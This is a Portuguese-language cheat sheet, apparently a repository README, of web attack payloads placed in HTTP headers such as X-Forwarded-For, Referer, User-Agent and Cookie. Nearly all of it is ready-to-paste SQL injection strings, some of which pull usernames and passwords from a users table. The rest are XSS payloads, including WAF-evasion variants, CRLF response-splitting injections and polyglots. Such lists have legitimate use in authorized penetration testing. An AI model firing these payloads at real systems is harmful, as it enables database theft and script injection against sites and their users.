# XSS-Header-Based
payloads para SQL Injection e XSS baseados em cabeçalhos HTT, incluindo técnicas evasivas para bypass
## **SQL Injection (Header-Based)**
Esses payloads exploram **injeções SQL em cabeçalhos HTTP**, úteis quando a aplicação faz logs de requisições ou usa os valores internamente.

### **Básicos**  
```http
X-Forwarded-For: 1' OR '1'='1' -- 
X-Forwarded-Host: 1' OR '1'='1' -- 
Referer: 1' OR '1'='1' -- 
User-Agent: 1' OR '1'='1' -- 
Cookie: 1' OR '1'='1' -- 
```

### **Delay e Time-Based Blind SQLi**
```http
X-Forwarded-For: 1' AND (SELECT SLEEP(5))-- 
X-Forwarded-Host: 1' AND IF(1=1, SLEEP(5), 0)-- 
Referer: '; WAITFOR DELAY '0:0:5'--  
User-Agent: 1' AND (SELECT IF(1=1, SLEEP(5), 0))-- 
Cookie: ' OR pg_sleep(5) --  
```

### **Union-Based SQLi**
```http
X-Forwarded-For: ' UNION SELECT NULL, username, password FROM users -- 
X-Forwarded-Host: ' UNION SELECT NULL, database(), version() -- 
Referer: ' UNION SELECT NULL, @@version, user() -- 
User-Agent: ' UNION SELECT NULL, table_name FROM information_schema.tables -- 
```

### **Boolean-Based Blind SQLi**
```http
X-Forwarded-For: ' AND 1=1 -- (válido)  
X-Forwarded-For: ' AND 1=2 -- (falso)  
X-Forwarded-Host: ' AND (SELECT COUNT(*) FROM users) > 0 --  
Referer: ' AND (SELECT LENGTH(database())) > 0 --  
User-Agent: ' AND ASCII(SUBSTRING(database(),1,1)) > 64 --  
```

---

## **XSS (Header-Based)**
Esses payloads tentam injetar scripts maliciosos usando cabeçalhos HTTP.

### **Básicos**
```http
X-Forwarded-Host: "><script>alert('XSS')</script>  
X-Forwarded-For: '"><script>alert(document.domain)</script>  
Referer: "><img src=x onerror=alert(1)>  
User-Agent: '"><svg onload=alert(document.cookie)>  
Cookie: "><iframe src=javascript:alert(document.domain)>  
```

### **Evasão de Filtragem (Bypass WAF)**
```http
X-Forwarded-Host: "><ScRiPt>alert('XSS')</ScRiPt>  
X-Forwarded-For: '"><sVg oNlOaD=prompt(1)>  
Referer: "><IMG SRC=jAVasCript:alert(1)>  
User-Agent: '"><dEtAiLs OpEn oNToGgLe=confirm(1)>  
Cookie: "><IFRAME SRC=JaVaScRiPt:alert(document.domain)>  
```

### **XSS via HTTP Response Splitting**
```http
X-Forwarded-For: %0D%0ASet-Cookie:%20XSS=alert(document.cookie)  
Referer: %0D%0AContent-Length:%200%0D%0A%0D%0A<script>alert('XSS')</script>  
User-Agent: %0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<script>alert(1)</script>  
```

### **Polyglot XSS**
```http
X-Forwarded-Host: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//  
Referer: "><scrIpt sRC=data:text/javascript,alert(1)>  
User-Agent: javascript:"/*-/*`/*\`/*'/*"/**/(/* */prompt(1))//  
```
